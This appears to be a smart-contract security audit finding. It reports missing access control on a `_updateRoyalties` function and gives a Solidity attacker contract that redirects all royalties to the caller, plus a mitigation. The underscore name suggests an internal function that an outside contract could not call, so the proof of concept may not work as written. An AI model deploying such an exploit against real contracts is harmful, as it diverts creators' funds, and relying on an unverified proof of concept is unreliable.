# Vulnerability details

## Summary

The _updateRoyalties function lacks access control, allowing any external or internal contract interaction to update the royalties for any token ID. This exposes the contract to potential unauthorized manipulation, enabling an attacker to modify royalty configurations arbitrarily.

## Impact
Unauthorized royalty updates could result in misallocated royalties, leading to loss of funds for the intended recipients and harming the overall integrity of the royalty system.


## Proof of Concept

```

// Attacker contract that will exploit the missing access control in _updateRoyalties

contract Attacker {
    CreatorRoyaltiesControl targetContract;

    constructor(address _targetAddress) {
        targetContract = CreatorRoyaltiesControl(_targetAddress);
    }

    function exploit(uint256 tokenId) external {
        CreatorRoyaltiesControl.RoyaltyConfiguration memory newConfig = 
            CreatorRoyaltiesControl.RoyaltyConfiguration({
                royaltyRecipient: msg.sender,  // Attacker's address
                royaltyBPS: 10000  // Max royalty (100%)
            });

        // Arbitrarily update royalties for the given tokenId
        targetContract._updateRoyalties(tokenId, newConfig);
    }
}

```
Steps:

1.Deploy the Attacker contract.
2.Call the exploit function with any valid token ID.
3.The attacker can set their own address as the royalty recipient with 100% royalties, diverting all future royalty payments to themselves.

## Tools Used
Manual Review

## Recommended Mitigation Steps

Implement access control (e.g., onlyOwner or a specific role such as royaltyManager) to restrict the use of the _updateRoyalties function to only authorized addresses.
